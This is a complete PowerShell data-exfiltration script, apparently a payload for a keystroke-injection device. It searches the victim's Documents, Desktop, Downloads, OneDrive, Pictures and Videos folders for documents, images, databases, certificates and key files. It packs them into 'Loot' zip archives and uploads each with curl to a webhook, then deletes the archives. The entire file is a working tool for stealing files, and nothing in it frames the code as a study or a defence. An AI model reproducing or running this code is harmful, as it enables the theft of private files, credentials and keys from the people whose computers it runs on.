

$hookurl = "$dc"
# shortened URL Detection
if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}

Function Exfiltrate {

param ([string[]]$FileType,[string[]]$Path)
$maxZipFileSize = 25MB
$currentZipSize = 0
$index = 1
$zipFilePath ="$env:temp/Loot$index.zip"

If($Path -ne $null){
$foldersToSearch = "$env:USERPROFILE\"+$Path
}else{
$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
}

If($FileType -ne $null){
$fileExtensions = "*."+$FileType
}else {
$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

foreach ($folder in $foldersToSearch) {
    foreach ($extension in $fileExtensions) {
        $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
        foreach ($file in $files) {
            $fileSize = $file.Length
            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                $zipArchive.Dispose()
                $currentZipSize = 0
                curl.exe -F file1=@"$zipFilePath" $hookurl
                Remove-Item -Path $zipFilePath -Force
                Sleep 1
                $index++
                $zipFilePath ="$env:temp/Loot$index.zip"
                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
            }
            $entryName = $file.FullName.Substring($folder.Length + 1)
            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
            $currentZipSize += $fileSize
        }
    }
}
$zipArchive.Dispose()
curl.exe -F file1=@"$zipFilePath" $hookurl
Remove-Item -Path $zipFilePath -Force
Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
}

Exfiltrate
